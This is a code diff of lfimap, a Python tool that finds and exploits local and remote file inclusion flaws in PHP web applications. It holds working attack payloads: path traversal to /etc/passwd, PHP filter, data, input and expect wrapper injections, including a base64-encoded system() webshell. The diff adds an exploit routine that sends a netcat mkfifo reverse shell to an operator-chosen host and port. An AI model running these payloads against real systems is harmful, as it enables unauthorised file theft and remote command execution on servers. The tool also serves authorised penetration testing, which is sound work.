@@ -10,32 +10,14 @@ import argparse
 import requests
 import requests.exceptions
 import base64
+import http.server
+import socketserver
 
 from argparse import RawTextHelpFormatter
-from urllib.parse import urlsplit
-from urllib.parse import urlparse
-
-#proxies = {}
 
 exploits = []
 proxies = {}
 
-exploit = {'REQUST_TYPE': '',
-               'EXPLOIT_TYPE': '',
-           'GETVAL':'',
-           'POSTVAL':'',
-           'HEADERS':''}
-SYSINFO = {'OS_NAME': '',
-              'OS_VERSION':'',
-              'BITNESS':'',
-              'ENV_VARS':''
-        }
-USRINFO = {}
-#awk -F: '/\/home/ && ($3 >= 1000) {printf "%s:%s\n",$1,$3}' /etc/passwd
-
-PROCINFO = {}
-SOFTWINFO = {}
-NETINFO = {''}
 def prepareHeaders():
     user_agents = [
                 ":Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
@@ -48,9 +30,9 @@ def prepareHeaders():
                 ":Opera/8.00 (Windows NT 5.1; U; en)",
                 ":Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                   ]                                                                                                                                                                             
-                                                                                                                                                                                                
     headers = {}                                                                                                                                                                                
-    if(args.agent):                                                                                                                                                                  headers['User-Agent'] = ":" + agent                                                                                                                                                     
+    if(args.agent):
+        headers['User-Agent'] = ":" + agent                                                                                                                                                     
     else:                                                                                                                                                                    
         headers['User-Agent'] = random.choice(user_agents)                                                                                                                                      
     if(args.referer):
@@ -60,13 +42,14 @@ def prepareHeaders():
     headers['Accept-Encoding'] = ':gzip, deflate'
     headers['Accept'] = ':text/html,application/xhtml+xml,application/xml;'
     headers['Connection'] = ':Close'
-    
     return headers
+
 
 def addHeader(newKey, newVal):
     headers[newKey] = newVal
 
-def getExploit(req, request_type, exploit_type, getVal, postVal, headers):
+
+def getExploit(req, request_type, exploit_type, getVal, postVal, headers, attackType, os):
     global exploits
     e = {}
     e['REQUEST_TYPE'] = request_type
@@ -74,11 +57,15 @@ def getExploit(req, request_type, exploit_type, getVal, postVal, headers):
     e['GETVAL'] = getVal
     e['POSTVAL'] = postVal
     e['HEADERS'] = req.headers
+    e['ATTACK_METHOD'] = attackType
+    e['OS'] = os
     exploits.append(e)
-
     return e
 
 def test_wordlist(url):
+    if(args.verbose):
+        print("Testing path truncation using '" + wordlist + "' wordlist ...")
+
     f = open(wordlist, "r")
     
     for line in f:
@@ -93,13 +80,24 @@ def test_wordlist(url):
             sys.exit(-1)
 
         if(checkPayload(res)):
-            getExploit(res, 'GET', 'LFI', u, '', headers)
+            if('/etc/passwd' in u):
+                tempUrl = u.replace('/etc/passwd', 'TMP')
+                os = 'LINUX'
+            else:
+                tempUrl = u.replace('Windows/System32/drivers/etc/hosts', 'TMP')
+                os = 'WINDOWS'
+
+            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'TRUNC', os)
             print("[+] LFI -> " + u)
-            return  #To prevent further traffic
+            return  #To prevent further unnecessary traffic
 
     f.close()
 
+
 def test_php_filter(url):
+    if(args.verbose):
+        print("Testing PHP filter wrapper ...")
+
     testL = []
     testL.append("php://filter/resource=/etc/passwd")
     testL.append("php://filter/convert.base64-encode/resource=/etc/passwd")
@@ -124,8 +122,9 @@ def test_php_filter(url):
             sys.exit(-1)
 
         if(checkPayload(res)):
-            getExploit(res, 'GET', 'LFI', u, '', headers)
-            print("[+] LFI -> " + u)
+            tempUrl = u.replace('/etc/passwd', 'TMP')
+            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
+            print("[+] LFI -> " + tempUrl)
     
     #Windows
     for i in range(len(testW)):
@@ -138,12 +137,15 @@ def test_php_filter(url):
             sys.exit(-1)
 
         if(checkPayload(res)):
-            getExploit(res, 'GET', 'LFI', u, '', headers)
-            print("[+] LFI -> " + u)
+            tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'TMP')
+            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
+            print("[+] LFI -> " + tempUrl)
 
 
-#OK
 def test_data_wrapper(url):
+    if(args.verbose):
+        print("Testing PHP data wrapper ...")
+
     testL = []
     testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
     testW = []
@@ -160,8 +162,9 @@ def test_data_wrapper(url):
             sys.exit(-1)
 
         if(checkPayload(res)):
-            getExploit(res, 'GET', 'LFI', u, '', headers)
-            print("[+] LFI -> " + u)
+            tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
+            getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'LINUX')
+            print("[+] RCE -> " + u)
     
     #Windows
     for i in range(len(testW)):
@@ -174,10 +177,18 @@ def test_data_wrapper(url):
             sys.exit(-1)
 
         if(checkPayload(res)):
-            getExploit(res, 'GET', 'LFI', u, '', headers)
-            print("[+] LFI -> " + u)
+            tempUrl = u.replace('ipconfig', 'TMP')
+            getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'WINDOWS')
+            print("[+] RCE -> " + u)
+    
+    if(args.revshell):
+        exploit(exploits, 'DATA')
+
 
 def test_php_input(url):
+    if(args.verbose):
+        print("Testing PHP input wrapper ...")
+
     testL = []
     testL.append("php://input&cmd=cat%20/etc/passwd")
     
@@ -202,9 +213,9 @@ def test_php_input(url):
 
             if(checkPayload(res)):
                 print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
-                if(args.en_sys):
-                    enumerate_system(getExploit(res, 'POST', 'RCE', u, posts[j], headers))
-
+                tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
+                getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', 'LINUX')
+    
     #Windows
     for k in range(len(testW)):
         if("DESTROY" in url):
@@ -218,10 +229,18 @@ def test_php_input(url):
                 sys.exit(-1)
 
             if(checkPayload(res)):
-                getExploit(res, 'POST', 'RCE', u, posts[l], headers)
+                tempUrl = u.replace('ipconfig', 'TMP')
+                getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'LINUX')
                 print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
+    
+    if(args.revshell):
+        exploit(exploits, 'INPUT')
+
 
 def test_expect_wrapper(url):
+    if(args.verbose):
+            print("Testing PHP expect wrapper ...")
+
     testL = []
     testL.append("expect://cat%20%2Fetc%2Fpasswd")
     
@@ -240,8 +259,9 @@ def test_expect_wrapper(url):
             sys.exit(-1)
 
         if(checkPayload(res)):
-            getExploit(res, 'GET', 'RCE', u, testL[i], headers)
-            print("[+] RCE -> " + u)
+            tempUrl = u.replace('cat%20%2Fetc%2Fpasswd', 'TMP')
+            getExploit(res, 'GET', 'RCE', tempUrl, testL[i], headers, 'EXPECT', 'LINUX')
+            print("[+] RCE -> " + tempUrl)
 
     #Windows
     for j in range(len(testW)):
@@ -255,10 +275,17 @@ def test_expect_wrapper(url):
             sys.exit(-1)
         
         if(checkPayload(res)):
-            getExploit(res, 'GET', 'RCE', u, testW[j], headers)
-            print("[+] RCE -> " + u)
+            tempUrl = u.replace('ipconfig', 'TMP')
+            getExploit(res, 'GET', 'RCE', tempUrl, testW[j], headers, 'EXPECT', 'WINDOWS')
+            print("[+] RCE -> " + tempUrl)
+    
+    if(args.revshell):
+        exploit(exploits, 'EXPECT')
 
 def test_rfi(url):
+    if(args.verbose):
+        print("Testing for RFI ...")
+
     tests = []
     tests.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2FREADME.md")
     for i in range(len(tests)):
@@ -267,32 +294,14 @@ def test_rfi(url):
         try:
             res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
             if(checkPayload(res)):
-                getExploit(res, 'GET', 'RFI', u, tests[i], headers)
+                tempUrl = u.replace(tests[i], 'TMP')
+                getExploit(res, 'GET', 'RFI', tempUrl, tests[i], headers, 'RFI', 'UNKN')
                 print("[+] RFI -> " + u)
         except:
             pass
-#TODO
-def test_environ(url):
-    tests = []
-    tests.append("/proc/self/environ")
-    
-    for i in range(len(tests)):
-        if("DESTROY" in url):
-            u = url.replace("DESTROY", tests[i])
-            
-            try:
-                res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
-            except:
-                print("Proxy problem... Exiting now.")
-                sys.exit(-1)
-
-            if(checkPayload(res)):
-                getExploit(res, 'GET', 'LFI', u, tests[i], headers)
-                print("[+] LFI -> " + u)
 
 
-#You can add custom patterns in responses depending on the wordlist used
-#Checks if sent payload is executed
+#Checks if sent payload is executed, key word check in response
 def checkPayload(webResponse):
     KEY_WORDS = ["root:x:0:0", "www-data:", "HTTP_USER_AGENT",
                 "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0",
@@ -308,10 +317,66 @@ def checkPayload(webResponse):
             return True
     return False
 
-def enumerate_system(exploit):
-    #Linux
-    print("Enum_sys")
-    
+
+#Todo Future enumeration:
+#awk -F: '/\/home/ && ($3 >= 1000) {printf "%s:%s\n",$1,$3}' /etc/passwd
+#query = "awk -F: '/\/home/ && ($3 >= 1000) || ($3 == 0) {printf "%s\n",$1}' /etc/passwd"
+#echo -n "OS: "; uname -o; echo -n "Kernel: ";uname -srm; echo "\nENV VARIABLES:";printenv
+
+
+#Todo exploitation using input, data,expect for windows OS
+#Todo bash, python, php,... rev shells
+def exploit(exploits, method):
+    for i in range(len(exploits)):
+        exploit = exploits[i]
+        
+        ip = args.lhost
+        port = args.lport
+        
+        if(exploit['ATTACK_METHOD'] == method and method == 'INPUT'):
+            if(exploit['OS'] == 'LINUX'):
+                url = exploit['GETVAL']
+                
+                #Netcat
+                u = url.replace('TMP', 'which%20nc')
+                res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
+                if('/bin' in res.text and '/nc' in res.text):
+                    if(args.verbose): print("[i] Target has netcat installed")
+                    ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
+                    u = url.replace('TMP', ncPayload)
+                    
+                    print("[i] Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
+                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                return         
+        
+
+        elif(exploit['ATTACK_METHOD'] == method and method == 'DATA'):
+            if(exploit['OS'] == 'LINUX'):
+                url = exploit['GETVAL']
+                u = url.replace('TMP', 'which%20nc')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/nc' in res.text):
+                    if(args.verbose): print("[i] target has netcat installed")
+                
+                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
+                    print("Sending revese shell to " + ip + ":"+str(port) + " using nc ...")
+                    res = requests.get(u, headers = headers, proxies = proxies)
+                return
+
+
+        elif(exploit['ATTACK_METHOD' == method and method == 'EXPECT']):
+            if(exploit['OS' == 'LINUX']):
+                url = exploit['GETVAL']
+                u = url.replace('TMP', 'which%20nc')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/nc' in res.text):
+                    if(args.verbose): print("[i] Target has netcat installed")
+
+                    u = url.replace('TMP',"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
+                    print("Sending reverse shell to " + ip + ":" + str(port) + " using nc ...")
+                    res = requests.get(u, headers = headers, proxies = proxies)
+                return
+
 
 def main():
     global exploits
@@ -328,7 +393,8 @@ def main():
         test_data_wrapper(url)
         test_expect_wrapper(url)
         test_rfi(url)
-        test_environ(url)
+        
+
         test_wordlist(url)
         
         print("Done.")
@@ -353,9 +419,6 @@ def main():
     if(args.rfi):
         default = False
         test_rfi(url)
-    if(args.environ): #This should be last
-        default = False  
-        test_environ(url)
 
     #Default behaviour
     if(default):
@@ -368,53 +431,37 @@ def main():
     print("Done.")
     exit(0)
 
-#def enumerate_system(url, payload):
-    #Get os name, bitness, kernel version, env variables
-
-    #If payload is not provided, use os detection using other methods
-    #os info using nmap?
-
 if(__name__ == "__main__"):
     
     print("")
     parser = argparse.ArgumentParser(description="lfimap, LFI discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)
 
     optionsGroup = parser.add_argument_group('GENERAL')
-    optionsGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=DESTROY" ###DONE""")
-    optionsGroup.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45" ###DONE')
-    optionsGroup.add_argument('-p', '--proxy', type=str, metavar = "<address>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080' ###DONE")
-    optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent ###DONE")
-    optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer ###DONE")
+    optionsGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=DESTROY" """)
+    optionsGroup.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
+    optionsGroup.add_argument('-p', type=str, metavar = "<proxy>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080'")
+    optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent")
+    optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer")
     
     attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
-    attackGroup.add_argument('--php-filter', action="store_true", dest = 'php_filter', help="\t\t Attack using php filter wrapper ###DONE")
-    attackGroup.add_argument('--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper ###DONE")
-    attackGroup.add_argument('--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper ###DONE")
-    attackGroup.add_argument('--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper ###DONE")
-    attackGroup.add_argument('--phpinfo-race', action="store_true", dest="phpinfo_race", help="\t\t Attack using phpinfo race condition")
-    attackGroup.add_argument('--log-poison', action="store_true", dest="log_poison", help="\t\t Attack using log file poisoning")
-    attackGroup.add_argument('--self-fd', action="store_true", dest="self_fd", help="\t\t Attack using '/proc/self/fd' technique")
-    attackGroup.add_argument('--self-environ', action = "store_true", dest='environ', help="\t\t Attack using '/proc/self/environ' injection ###TODO TEST")
-    attackGroup.add_argument('--rfi', action = "store_true", dest='rfi', help="\t\t Attack using remote file inclusion ###TODO IMPROVE")
-    attackGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for attack (default wordlist.txt) ###DONE")
-    attackGroup.add_argument('-a', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to compromise a target")
-   
+    attackGroup.add_argument('--php-filter', action="store_true", dest = 'php_filter', help="\t\t Attack using php filter wrapper")
+    attackGroup.add_argument('--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper")
+    attackGroup.add_argument('--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper")
+    attackGroup.add_argument('--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper")
+    attackGroup.add_argument('--rfi', action = "store_true", dest='rfi', help="\t\t Attack using remote file inclusion")
+    attackGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for truncation attack")
+    attackGroup.add_argument('-a', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to attack")
 
-    postExpGroup = parser.add_argument_group('ENUMERATE')
-    postExpGroup.add_argument('--enumerate-system', action="store_true", dest="en_sys", help="\t\t Enumerate target system info")
-    postExpGroup.add_argument('--enumerate-users', action="store_true", dest="en_usr", help="\t\t Enumerate target users info")
-    postExpGroup.add_argument('--enumerate-process', action="store_true", dest="en_proc", help="\t\t Enumerate target process info")
-    postExpGroup.add_argument('--enumerate-network', action="store_true", dest="en_net", help="\t\t Enumerate target network info")
-    postExpGroup.add_argument('--enumerate-files', action="store_true", dest="en_file", help="\t\t Enumerate target file info")
-    postExpGroup.add_argument('--enumerate-shares', action="store_true", dest="en_share", help="\t\t Enumerate target share info")
+    #postExpGroup = parser.add_argument_group('ENUMERATE')
     
     payloadGroup = parser.add_argument_group('PAYLOAD')
-    payloadGroup.add_argument('-s', '--spawn-shell', action="store_true", dest="spawn_shell", help="\t\t Spawn reverse shell connection")
-    payloadGroup.add_argument('-x', type=str, metavar = "<command>", dest="x", help= "\t\t Execute command on remote computer")
-    
+    payloadGroup.add_argument('--send-revshell',action="store_true", dest="revshell", help="\t\t Send reverse shell connection if possible (Setup reverse handler first.)")
+    payloadGroup.add_argument('--lhost', type=str, metavar="<lhost>", dest="lhost", help="\t\t Specify localhost IP address for reverse connection")
+    payloadGroup.add_argument('--lport', type=int, metavar="<lport>", dest="lport", help="\t\t Specify local PORT number for reverse connection")
+
     otherGroup = parser.add_argument_group('OTHER')
     otherGroup.add_argument('-v', '--verbose', action="store_true", dest="verbose", help="\t\t Verbose output\n")
-    otherGroup.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message ###DONE")
+    otherGroup.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message")
     args = parser.parse_args()
 
     url = args.url
@@ -427,8 +474,22 @@ if(__name__ == "__main__"):
     test_all = args.test_all
     agent = args.agent
     referer = args.referer
-    environ = args.environ
     rfi = args.rfi
+
+    
+    if(args.revshell):
+        if(not args.lhost or not args.lport):
+            print("Please, specify localhost IP and PORT number for reverse shell! Exiting...")
+            sys.exit(-1)
+        else:
+            reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
+            if(not re.match(reg, args.lhost)):
+                print("LHOST IP address is not valid. Exiting...")
+                sys.exit(-1)
+
+            if(args.lport<1 or args.lport>65534):
+                print("LPORT must be between 0 and 65535. Exiting ...")
+                sys.exit(-1)
 
 
     #Checks URL arg
